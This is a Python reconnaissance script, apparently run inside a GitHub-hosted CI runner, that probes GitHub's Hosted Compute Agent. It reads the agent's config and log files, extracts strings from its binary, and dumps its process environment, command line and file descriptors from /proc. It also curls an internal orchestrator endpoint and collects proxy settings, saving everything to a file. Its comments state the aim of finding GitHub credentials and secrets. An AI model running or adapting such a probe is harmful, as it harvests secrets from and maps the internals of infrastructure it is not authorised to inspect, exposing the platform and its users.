#!/usr/bin/env python3
"""U6 probe4: /opt/hca (GitHub Hosted Compute Agent) + orchestrator reach."""
import json
import os
import subprocess

OUT = []


def hdr(t):
    OUT.append("\n" + "=" * 70)
    OUT.append("### " + t)
    OUT.append("=" * 70)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def show(path, n=4000):
    if os.path.exists(path):
        st = os.stat(path)
        OUT.append("\n--- %s (mode %o uid=%d gid=%d size=%d)" % (
            path, st.st_mode & 0o7777, st.st_uid, st.st_gid, st.st_size))
        try:
            with open(path, "r", errors="replace") as f:
                OUT.append(f.read(n))
        except Exception as e:  # noqa: BLE001
            OUT.append("READ-ERR %r" % (e,))
    else:
        OUT.append("\n--- %s MISSING" % path)


hdr("1. /opt/hca tree (full listing)")
OUT.append(sh("ls -laR /opt/hca 2>&1 | head -80"))

hdr("2. GitHub Hosted Compute Agent config files")
show("/opt/hca/.settings")
show("/opt/hca/diagnostics.json")
show("/opt/hca/egress_proxy_condition.json")

hdr("3. /opt/hca/logs")
OUT.append(sh("ls -la /opt/hca/logs 2>&1"))
OUT.append(sh("for f in /opt/hca/logs/*; do echo \"### $f\"; head -c 2500 \"$f\"; echo; done 2>&1"))

hdr("4. hosted-compute-agent binary: embedded strings that look like endpoints/creds")
OUT.append(sh("strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -E '^https?://' "
             "| sort -u | head -40"))
OUT.append("\n-- env-var names the agent reads (may name GitHub secrets):")
OUT.append(sh("strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -E '^[A-Z][A-Z0-9_]{6,40}$' "
             "| sort -u | head -50"))

hdr("5. hosted-compute-agent.service unit + env (GitHub-owned unit)")
OUT.append(sh("systemctl cat hosted-compute-agent.service 2>&1 | head -40"))
OUT.append("\n$ systemctl show hosted-compute-agent -p Environment 2>&1")
OUT.append(sh("systemctl show hosted-compute-agent -p Environment -p ExecStart 2>&1 | head -20"))
OUT.append("\n$ /proc/<hca pid>/environ:")
OUT.append(sh("pid=$(pgrep -f hosted-compute-agent | head -1); echo pid=$pid; "
             "tr '\\0' '\\n' < /proc/$pid/environ 2>&1 | head -30"))
OUT.append("\n$ /proc/<hca pid>/cmdline:")
OUT.append(sh("pid=$(pgrep -f hosted-compute-agent | head -1); tr '\\0' ' ' < /proc/$pid/cmdline 2>&1"))

hdr("6. read /proc of the agent: open fds, cwd (any GitHub credential files?)")
OUT.append(sh("pid=$(pgrep -f hosted-compute-agent | head -1); ls -la /proc/$pid/fd 2>&1 | head -25"))
OUT.append(sh("pid=$(pgrep -f hosted-compute-agent | head -1); ls -la /proc/$pid/root 2>&1"))

hdr("7. the orchestrator URL from IMDS tags")
OUT.append(sh("curl -s -m 15 -o /dev/null -w 'status=%{http_code} time=%{time_total}\\n' "
             "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1"))
OUT.append(sh("curl -s -m 15 -D - https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1 "
             "| head -30"))

hdr("8. egress: what is proxied? (curl -v to a normal host, look for proxy env)")
OUT.append(sh("env | grep -i -E 'proxy|no_proxy' 2>&1"))
OUT.append(sh("cat /etc/environment 2>&1"))
OUT.append(sh("cat /opt/hca/.settings 2>/dev/null | python3 -m json.tool 2>&1 | head -60"))

text = "\n".join(OUT)
print(text)
with open(os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "probe-D.txt"), "w") as f:
    f.write(text)
